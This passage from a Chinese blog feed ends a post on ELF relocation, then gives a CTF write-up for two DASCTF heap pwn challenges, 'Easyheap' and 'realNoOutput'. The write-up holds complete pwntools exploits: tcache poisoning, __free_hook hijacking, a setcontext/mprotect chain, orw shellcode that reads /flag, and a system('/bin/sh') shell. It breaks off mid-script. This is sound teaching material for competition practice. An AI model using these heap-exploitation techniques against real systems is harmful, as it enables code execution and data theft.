src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210810182800665.png" alt="Section合并"></p><h2 id="引用重定位"><a href="#引用重定位" class="headerlink" title="引用重定位"></a>引用重定位</h2><p>完成符号解析和section合并后基本EOF文件成型，但是函数或者变量之间的调用位置还没有写入，这时就需要对所有的符号进行重定位。</p><p>我们先来看看重定位表的结构</p><h3 id="Relocation-Table"><a href="#Relocation-Table" class="headerlink" title="Relocation Table"></a>Relocation Table</h3><p>对于可以重定位的ELF文件来说，它必须有重定位表。对于每个要被重定位的ELF段都有一个对应的重定位表。对应.text有<strong>.rel.text</strong>，对于.data有<strong>.rel.data</strong>。每个要被重定位的地方叫做重定位入口。</p><p>重定位入口结构为：</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>r_offset</td><td>重定位入口的偏移，这个值表示该重定位入口所要修正的位置的第一个字节相对于段的偏移</td></tr><tr><td>r_info</td><td>重定位入口的类型和符号，一部分表示重定位入口的类型，一部分是重定位入口在符号表的下标</td></tr></tbody></table><p>链接器知道了以上两个成员就知道了在哪里进行重定位，又重定位到哪里去。</p><p>而重定位的类型则对应着多种多样的寻址模式，而重定位的基本类型分为相对寻址和绝对寻址。</p><h3 id="两种指令修正方式"><a href="#两种指令修正方式" class="headerlink" title="两种指令修正方式"></a>两种指令修正方式</h3><p>我们先设：</p><p><strong>A = 保存在被修正位置的值</strong></p><p><strong>P = 被修正的位置，可以通过r_offset得到</strong></p><p><strong>S = 符号的实际地址，这个可以通过r_info得到</strong></p><h4 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h4><p>对与相对寻址而言，我们先通过重定位表的r_offset找到了<em><strong>P</strong></em>，也就是我们要修改的位置。</p><p>然后通过r_info找到对应要引用符号的的符号表，也就找到了<em><strong>S</strong></em>，符号的相对位置。</p><p>仅仅这样是不够的我们还要考虑rip指针在引用时的位置，这由指令本身决定，在被要被修改的地方保存着这值<em><strong>A</strong></em>。</p><p>那么相对寻址要修改为<em><strong>S-P+A</strong></em>。这样我们就实现了相对寻址。</p><h4 id="绝对寻址"><a href="#绝对寻址" class="headerlink" title="绝对寻址"></a>绝对寻址</h4><p>绝对寻址就不用考虑二者的偏移，只需要考虑S和A即可，既写入的是S+A。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这些就是静态链接的一些基本的框架了，了解了这些也就基本了解了链接的大致过程。学习这一块翻了好多书，也看了些视频，我会列在下面的参考资料里，有不明白的地方供大家参考。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>哔哩哔里up主<em><strong>yaaangmin</strong></em>的视频：深入理解计算机系统合集(<a href="https://www.bilibili.com/video/BV17K4y1N7Q2">https://www.bilibili.com/video/BV17K4y1N7Q2</a>)</p><p>以及其编写的文档：<a href="https://github.com/yangminz/bcst_csapp/releases/tag/chapter_1_2_3">https://github.com/yangminz/bcst_csapp/releases/tag/chapter_1_2_3</a> </p><p><em><strong>《深入了解计算机系统(csapp)》</strong></em></p><p><em><strong>《程序员的自我修养——链接、装载与库》</strong></em></p><p><em><strong>《linux二进制分析》</strong></em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> link </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF July X CBCTF 4th pwn</title>
      <link href="/2021/08/04/DASCTF%20July%20X%20CBCTF%204th%20pwn/"/>
      <url>/2021/08/04/DASCTF%20July%20X%20CBCTF%204th%20pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前写了一半的ret2dl的博客还没写完，本来准备边写边学。后面发现涉及的东西有些多，所以还是准备彻底理解了再接着写。最近打了安恒的比赛，这里记录和复现一下这场比赛的pwn。</p><h1 id="Easyheap"><a href="#Easyheap" class="headerlink" title="Easyheap"></a>Easyheap</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>我们先分析一下题目，开始看到main函数开始有一些做初始化的函数，可以看到题目开了沙盒，我们来查看一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731105902768.png" alt="ida里发现的沙盒"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo seccomp-tools dump ./Easyheap </span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731110022532.png" alt="查看开了什么沙盒"></p><p>可以看到我们是不可以执行execve的，那么就只能使用orw来读取我们的flag了</p><p>我们接着分析几个函数</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731151445458.png" alt="add"></p><p>发现add这里存在漏洞，<strong>strdup只会根据你输入的长度来确定malloc的大小和nbytes无关，heap_size的大小只和我们输入的大小nbytes有关，而heap_addr指向的堆是由strdup申请来的，其大小和我们输入的字符串长度有关。</strong></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731151843085.png" alt="show"></p><p>show函数没有什么特殊的，先查看heap里是否有</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731152046694.png" alt="delete"></p><p>delete也一样没有什么特殊的，清空了指针</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731152303249.png" alt="edit"></p><p>edit这里有add函数伏笔回收，如果我们在add时<strong>输入的长度大于我们输入字符串长度</strong>，这里我们就可以<strong>overwrite</strong></p><h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>要想泄露libc的地址我们需要先将chunk放入unsortedbin，题目的libc版本是<em>Ubuntu GLIBC 2.27-3ubuntu1.4</em>所以我们需要先<strong>填满tcache</strong>，然后提前申请好两个chunk，将后面的chunk放入unsorted_bin,通过上面heap的overwrite，来查看libc相对偏移。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#0-6</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;interval&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804181622718.png" alt="填满tcache"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182003314.png" alt="overwrite"></p><p>得到我们的libc</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182401716.png" alt="泄露libc"></p><p>将我们可能需要的偏移全部计算出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc.address=un_addr-<span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&#x27;libc.address : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook : &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">set_context=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br></pre></td></tr></table></figure><p>恢复之前overwrite的chunk，否侧无法从中申请到后面的chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182814206.png" alt="修复chunk"></p><p>我们知道了libc之后现在就可以去<strong>劫持hook</strong>了，我们将之前释放的chunk切割一块出来，再将其放入tcache。接下来再次<strong>通过overwrite来劫持free_hook</strong>，这样free_hook就被放在tcache的链表。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;free&#x27;</span>)<span class="comment">#free_hook </span></span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804192601094.png" alt="free_hook被放入tcache"></p><p>成功劫持free_hook之后，由于这里开了沙盒所以需要我们做<strong>orw</strong>，首先我们需要一块可以调用写shellocde的地方，所以需要<strong>调用mprotect函数</strong>，在free_hook这一页添加可执行权限，而做到这个需要采用<strong>setcontent</strong>，我们将free_hook，改写为setcontent，这样我们调用free函数就会调用setcontent。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, &#123;&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x1000</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(new_addr)</span><br><span class="line">edit(<span class="number">1</span>,p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804194358784.png" alt="free_hook周围值"></p><p>我们再将我们接下来要free的chunk内填上我们需要的值：</p><p>将rsp赋值为我们之前布置好的free_hook+0x18，其指向shellcode，这样setcontent执行完就会跳转到我们的shellcode</p><p>其他的rdi，rsi，rdx，rip，都是为了改写free_hook对应页的权限。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">frame.rdi = new_addr</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">str</span>(frame))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804195139417.png" alt="image-20210804195139417"></p><p>接下来当setcontent执行完，指针会跳转到我们free_hook附近写下的shellcode中，<strong>shellcode会调用read函数</strong>，会在我们free_hook页让我们写入shellocode并跳转执行。我们写入一个标准的orw即可。这一部分比较模板化，可以记录下来，以后稍加改造就可以再次使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">xor rdx, rdx ;</span></span><br><span class="line"><span class="string">mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">mov rax, 60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sl(io,asm(shellcode2))</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./Easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./test&#x27;,&#x27;b *0x080492D4&#x27;)</span></span><br><span class="line">one_gadget=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./Easyheap&#x27;)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">fake_size,cont</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(fake_size))</span><br><span class="line">    sa(io,<span class="string">&#x27;Content:&#x27;</span>,cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(io,<span class="string">&#x27;Content:&#x27;</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;interval&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    dele(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">    libc.address=un_addr-<span class="number">0x3ebca0</span></span><br><span class="line">    success(<span class="string">&#x27;libc.address : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;malloc_hook : &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">    system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    set_context=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    pause()</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;free&#x27;</span>)<span class="comment">#free_hook 1</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">    shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    mov rsi, &#123;&#125;</span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp rsi</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(new_addr)</span><br><span class="line">    edit(<span class="number">1</span>,p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">    frame.rdi = new_addr</span><br><span class="line">    frame.rsi = <span class="number">0x1000</span></span><br><span class="line">    frame.rdx = <span class="number">7</span></span><br><span class="line">    frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,<span class="built_in">str</span>(frame))</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">    mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">    xor rdx, rdx ;</span></span><br><span class="line"><span class="string">    mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">    mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">    mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">    mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">    mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">    mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">    mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    sl(io,asm(shellcode2))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27832</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pwn()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h1 id="realNoOutput"><a href="#realNoOutput" class="headerlink" title="realNoOutput"></a>realNoOutput</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805165752186.png" alt="add"></p><p>这里我们可以看到，<strong>idx的范围是0-9，一共10个chunk</strong>，我们看看它的size数组和addr数组</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805165924643.png" alt="size&amp;addr"></p><p>发现其<strong>size数组大小为8</strong>，说明数组size大小有问题。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170703356.png" alt="delete"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170814359.png" alt="edit"></p><p>我们可以看到上图edit函数里如果不执行if函数仍然可以借助栈里残留的值来进行赋值，从而实现uaf</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170836608.png" alt="show"></p><h2 id="脚本编写-1"><a href="#脚本编写-1" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>我们先来泄露其libc，由于chunk申请出来的时候没有清理内存，所以我们可以将放在unsorted_bin中的chunk申请出来，得到libc基地址。先填满tcache</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">libc.address=un_addr-<span class="number">0x1ebce0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805163202933.png" alt="获取基地址"></p><p>再泄露一些我们需要的函数地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system : &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br></pre></td></tr></table></figure><p>接下来需要的就是劫持free_hook来获取shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p>chunk1和2是为了填充tcache，chunk3是为了后面劫持free_hook到system作为参数使用的。</p><p>至于chunk8是为了将chunk0的heap_addr赋值，由于数组越界，我们的chunk8的size会作为chunk0的地址使用。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805205403681.png" alt="addr数组"></p><p>接下来我们就要劫持free_hook了，先将free_hook放在tcache的链表上</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br></pre></td></tr></table></figure><p>这里edit的地址并不是chunk0的而是已经被free的chunk2遗留在栈上的，所以这里构造了一个uaf。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805205633751.png" alt="劫持free_hook"></p><p>剩下的事情就简单了我们将free_hook申请出来，将其修改为system的地址，然后delete之前准备好写有”/bin/sh\x00”的堆块，即可拿取shell。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span 